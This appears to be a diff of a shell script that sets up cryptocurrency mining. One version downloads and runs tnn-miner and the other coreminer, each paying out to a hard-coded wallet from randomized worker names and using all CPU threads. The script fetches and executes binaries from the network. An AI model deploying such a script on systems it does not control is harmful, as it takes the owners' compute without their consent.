@@ -1,8 +1,8 @@
-#!/bin/sh
-apt update && apt install sudo
-sudo apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-apt install curl libssl1.0-dev
-apt install libjansson-dev libjansson4 -y
-curl https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.9.0/downloads/Tnn-miner-arm64-v0.9.0.tar.gz -L -o Tnn-miner-arm64-v0.9.0.tar.gz
-tar xf Tnn-miner-arm64-v0.9.0.tar.gz
-./tnn-miner --xel --daemon-address stratum+tcp://de.xelis.herominers.com:1225 --worker-name $(shuf -n 1 -i 1-999)-BISMI --wallet xel:nc9cm9ps6asjenezcjx8ynjwg8zvc77t5xg3djjw2ke33lxxqvtqq6p39r8 --threads $(nproc --all)
+#!/bin/bash
+apt update
+apt install -y wget sudo curl
+wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
+tar xf coreminer-linux-x86_64.tar.gz
+cd coreapp
+./coreminer -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
+     -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008
